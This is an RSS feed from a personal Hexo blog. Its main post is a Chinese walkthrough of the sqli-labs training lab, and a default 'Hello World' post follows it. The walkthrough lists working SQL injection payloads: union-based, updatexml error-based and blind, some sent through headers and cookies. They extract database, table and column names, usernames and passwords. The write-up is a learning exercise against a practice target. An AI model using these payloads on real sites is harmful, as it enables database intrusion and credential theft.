<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>welcome to my blog</title>
        <link>http://example.com</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Mon, 24 Apr 2023 00:32:55 +0800</pubDate>
        <lastBuildDate>Mon, 24 Apr 2023 00:32:55 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/24/sqli-labs/</guid>
            <title></title>
            <link>http://example.com/2023/04/24/sqli-labs/</link>
            <pubDate>Mon, 24 Apr 2023 00:32:55 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;怎么判断字符型或者数字型&#34;&gt;&lt;a href=&#34;#怎么判断字符型或者数字型&#34; class=&#34;headerlink&#34; title=&#34;怎么判断字符型或者数字型?&#34;&gt;&lt;/a&gt;怎么判断字符型或者数字型?&lt;/h3&gt;&lt;p&gt;数字型:id&amp;#x3D;2和id&amp;#x3D;3-1返回界面相同&lt;br&gt;原理:说明2-1被解析了,旁边没有引号&lt;br&gt;字符型:id&amp;#x3D;2和id&amp;#x3D;2a页面一样就行&lt;br&gt;原理:MySQL等号两边类型不一致会发生强制转换,字符串-&amp;gt;数字&lt;/p&gt;
&lt;p&gt;group_concat是用,连接多行记录的函数&lt;/p&gt;
&lt;p&gt;less1&lt;br&gt;字符型注入&lt;br&gt;看源码:sql&amp;#x3D;”SELECT * FROM users WHERE id&amp;#x3D;’$id’ LIMIT 0,1”;&lt;/p&gt;
&lt;p&gt;因此:&amp;#x3D;&amp;#x3D;payload:1’   操作   –+&amp;#x3D;&amp;#x3D;&lt;/p&gt;
&lt;p&gt;?id&amp;#x3D;1’ order by 3–+&lt;br&gt;?id&amp;#x3D;1’ order by 4–+&lt;br&gt;?id&amp;#x3D;-1’ union select 1,2,3–+&amp;#x2F;&amp;#x2F;判断回显位&lt;br&gt;?id&amp;#x3D;-1’ union select 1,2,database()–+&lt;br&gt;?id&amp;#x3D;-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;database()–+&lt;/p&gt;
&lt;p&gt;?id&amp;#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&amp;#x3D;’users’ and table_schema&amp;#x3D;database()–+&lt;/p&gt;
&lt;p&gt;?id&amp;#x3D;-1’ union select 1,group_concat(username),group_concat(password) from users–+&lt;/p&gt;
&lt;p&gt;less2&lt;br&gt;数字型&lt;br&gt;看源码:sql&amp;#x3D;”SELECT * FROM users WHERE id&amp;#x3D;$id LIMIT 0,1”;&lt;br&gt;直接输入数字就好,解法与less1相同,去掉less1的’和–+即可&lt;/p&gt;
&lt;p&gt;布尔盲注:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&amp;#x27;D&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;less3&lt;br&gt;id&amp;#x3D;1’)–+&lt;/p&gt;
&lt;p&gt;less4&lt;br&gt;id&amp;#x3D;1”)–+&lt;/p&gt;
&lt;p&gt;less5&lt;br&gt;报错注入:updatexml函数&lt;br&gt;updatexml(xml_doument,XPath_string,new_value)&lt;br&gt;第一个参数：XML的内容&lt;br&gt;第二个参数：是需要update的位置XPATH路径&lt;br&gt;第三个参数：是更新后的内容&lt;br&gt;所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式 ,不对就爆出正确内容&lt;br&gt;可以校验的:0x7e(~),0x5e24(^$),’#’(#)&lt;br&gt;payload:&lt;br&gt;?id&amp;#x3D;1’ and updatexml(1,concat(0x7e,database()),1)–+暴当前数据库&lt;/p&gt;
&lt;p&gt;?id&amp;#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&amp;#x3D;database())),1)–+&lt;br&gt;此时会出现Subquery returns more than 1 row&lt;br&gt;1.可以用limit解决,limit 0,1 1,1 2,1 3,1&lt;br&gt;在limit 3,1找到users表&lt;br&gt;?id&amp;#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&amp;#x3D;database()limit 3,1)),1)–+&lt;br&gt;后面同理爆字段&lt;br&gt;2.加个group_concat解决&lt;br&gt;?id&amp;#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;database())),1)–+&lt;br&gt;过程同上&lt;br&gt;最后&lt;br&gt;?id&amp;#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)–+&lt;/p&gt;
&lt;p&gt;substr方法&lt;br&gt;‘ or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)–+&lt;br&gt;后面把1,31换成32,31&lt;br&gt;63,31&lt;br&gt;94,31&lt;/p&gt;
&lt;p&gt;less6&lt;br&gt;id&amp;#x3D;1” 与less5一样&lt;/p&gt;
&lt;p&gt;less7&lt;br&gt;布尔盲注&lt;br&gt;根据页面回显试探数据,可以二分法,函数:substring(),mid(),substr().&lt;br&gt;eg.?id&amp;#x3D;1’ and (select mid((select concat(user,0x7e,password) from users),1,1))&amp;#x3D;’’–+&lt;br&gt;一直到less10,布尔和时间盲注直接用sqlimap&lt;/p&gt;
&lt;p&gt;less11&lt;br&gt;输入?id&amp;#x3D;1发现url地址没有显示,抓包发现post方式&lt;br&gt;uname&amp;#x3D;11&amp;amp;passwd&amp;#x3D;1&amp;amp;submit&amp;#x3D;Submit&lt;br&gt;判断字符型&lt;br&gt;接下来用基本的union注入就欧克&lt;br&gt;less12&lt;br&gt;“)型,联合注入&lt;br&gt;less13&lt;br&gt;)’ # 加上报错注入&lt;br&gt;less14&lt;br&gt;“# 加上报错注入&lt;br&gt;less15&lt;br&gt;不显示报错信息只能盲注&lt;br&gt;单引号字符型的布尔盲注:&lt;br&gt;1’ –+&lt;br&gt;用脚本less15.py&lt;br&gt;用法:&lt;br&gt;from less15 import *&lt;br&gt;Database15()&lt;br&gt;Tables15()&lt;br&gt;Columns15(‘库’,’表’)&lt;br&gt;Content15(‘库’,’表’,’字段’,’字段’)&lt;br&gt;less16&lt;br&gt;双引号字符型加括号的盲注&lt;br&gt;1”) –+&lt;br&gt;脚本:less16.py&lt;/p&gt;
&lt;p&gt;less17&lt;br&gt;1.注入点在password栏里,单引号字符加报错注入&lt;br&gt;2.先抓包,copy to file,用sqlmap工具&lt;br&gt;python3 sqlmap.py -r 路径 &lt;/p&gt;
&lt;p&gt;less18&lt;br&gt;注入点在user-agent,且用户名密码必须正确&lt;br&gt;注意:闭合之前的部分必须为空,很恶心&lt;br&gt;‘ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;database())),1) or’&lt;/p&gt;
&lt;p&gt;最后:&lt;br&gt;‘ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’&lt;/p&gt;
&lt;p&gt;less19&lt;br&gt;与18一样,注入点在referer&lt;/p&gt;
&lt;p&gt;less20&lt;br&gt;输入正确的用户名和密码,抓到两个包,get包里有cookie,注入点在cookie&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/23/hello-world/</guid>
            <title>Hello World</title>
            <link>http://example.com/2023/04/23/hello-world/</link>
            <pubDate>Sun, 23 Apr 2023 23:55:29 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;Quick-Start&#34;&gt;&lt;a href=&#34;#Quick-Start&#34; class=&#34;headerlink&#34; title=&#34;Quick Start&#34;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&#34;Create-a-new-post&#34;&gt;&lt;a href=&#34;#Create-a-new-post&#34; class=&#34;headerlink&#34; title=&#34;Create a new post&#34;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Run-server&#34;&gt;&lt;a href=&#34;#Run-server&#34; class=&#34;headerlink&#34; title=&#34;Run server&#34;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Generate-static-files&#34;&gt;&lt;a href=&#34;#Generate-static-files&#34; class=&#34;headerlink&#34; title=&#34;Generate static files&#34;&gt;&lt;/a&gt;Generate static files&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Deploy-to-remote-sites&#34;&gt;&lt;a href=&#34;#Deploy-to-remote-sites&#34; class=&#34;headerlink&#34; title=&#34;Deploy to remote sites&#34;&gt;&lt;/a&gt;Deploy to remote sites&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
